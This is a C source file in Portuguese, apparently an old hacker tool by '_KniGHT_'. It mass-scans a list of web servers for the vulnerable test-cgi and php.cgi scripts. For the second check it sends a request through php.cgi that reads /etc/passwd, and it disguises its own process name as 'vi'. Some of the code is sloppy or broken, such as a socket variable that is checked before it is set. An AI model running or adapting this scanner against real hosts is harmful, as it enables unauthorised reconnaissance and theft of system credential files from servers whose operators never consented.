/* Programa: Procura CGI-BUGADO
 * Author : _KniGHT_ (knight@xxx.xxx.xxx.xxx)
 * Versao : 1.0beta SuCk'S
 * Descricao : Programa que Procura TEST-CGI e PHP.CGI nos provedores.
 * 
 * Compilar : cc -o procuracgi procuracgi.c
 * 
 * 
 * HaCk the WorlD ;) 
 *
*/

/* Comecando Includes */

#include "stdio.h"
#include "string.h"
#include "sys/types.h"
#include "sys/socket.h"
#include "sys/signal.h"
#include "sys/stat.h"
#include "sys/time.h"
#include "errno.h"
#include "netinet/in.h"
#include "netdb.h"
#include "unistd.h"


/* Finalizando Includes */

#define EMAILUSER  "coloque@seu.email.aqui"
#define BUFFER_SIZE 
#define MASCARA  "vi"
/* Comecando Variaveis Globais */
int sockdest, sockdest2;
char buffer2[2024];
char temp[1024];
/* Finalizando Variaveis Globais */

/* Comecando Sub Funcoes */
void testahttp(char *);
/* Iniciando STREAM para arquivo de ENTRADA e Saida */
FILE *site;
/* Finalizando Stream */

/* Comecando O pRoGrAMA */
void main(int argc, char *argv[]) 
{
   if(argc != 2) {
      printf("[T_e_S_t # c_G_I] & [P_h_P # C_g_I]\n");
      printf("(c) RwX for NiCe WolrD (c)\n");
      printf("by knight(knight@xxx.xxx.xxx.xxx)\n");
      printf("\n");
      printf("Usage: %s  [site list]\n",argv[0]);
      printf("\n");
      exit(0);
   }
  if((site=fopen(argv[1],"rt"))==NULL) {  
      printf("ooo Nao foi possivel abrir o arquivo SITE  ooo\n");
      exit(0);
   }
   puts("");
   printf("[T_e_S_t # c_G_I] & [P_h_P # C_g_I]\n");
   printf("(c) RwX for NiCe WolrD (c)\n");
   printf("by knight(knight@xxx.xxx.xxx.xxx)\n");
   printf("\n");
   strcpy(argv[0], MASCARA);
   testahttp(argv[1]);
}
/* Finalizando O mestre */
void testahttp(char *host) 
{
   char buffer[1024];
   while(!feof( site)) {   
	temp[0]=0;
	fgets(temp, 1024, site);
	if(temp[0])
	  {
	     struct sockaddr_in sin;
             struct hostent *he;
             struct servent *serv;
             temp[ strlen( temp) -1] = 0;
	     he=gethostbyname(temp);
             if(he) {
                memcpy((caddr_t)&sin.sin_addr.s_addr, he->h_addr, he->h_length);
	        if(sockdest < 0) {
                   printf("ooo Problema no Socket ooo\n");
                   exit(0);
	        }
                sin.sin_family = AF_INET;  
                sin.sin_port = htons(80);
                sockdest = socket(AF_INET, SOCK_STREAM, 0);
                if(connect(sockdest, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
	           printf("(%s) servidor HTTP desligado\n",temp);
          	} else {
   		   *buffer='\0';
		   sprintf(buffer,"\0");
		   sprintf(buffer,"GET /cgi-bin/test-cgi\n");
		   write(sockdest, buffer, strlen(buffer));
		   sockdest=read(sockdest, buffer, 1024);
		   if(strstr(buffer,"argc")) 
		     {
			printf("test-cgi encontrado (%s)\n",temp);
			strncpy(buffer,"\0", strlen(buffer));
		     }
                    sin.sin_family = AF_INET;  
                    sin.sin_port = htons(80);
                    sockdest2 = socket(AF_INET, SOCK_STREAM, 0);
                    if(connect(sockdest2, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
    	               printf("(%s) servidor HTTP desligado\n",temp);
          	    } else {
		      *buffer2='\0';
		       sprintf(buffer2,"\0");
		      sprintf(buffer2,"GET /cgi-bin/php.cgi?/etc/passwd\n");
		      write(sockdest2, buffer2, strlen(buffer2));
		      sockdest2=read(sockdest2, buffer2, 2024);
		      if(strstr(buffer2,"bin:")) 
		        {
    			printf("php-cgi encontrado (%s)\n",temp);
  			strncpy(buffer2,"\0", strlen(buffer2));
        	         }
		   }
	  	}
	     } else {
	    	printf("H0st (%s) nao encontrado\n",temp);
	     }
	  }
   }
   close(sockdest);
}

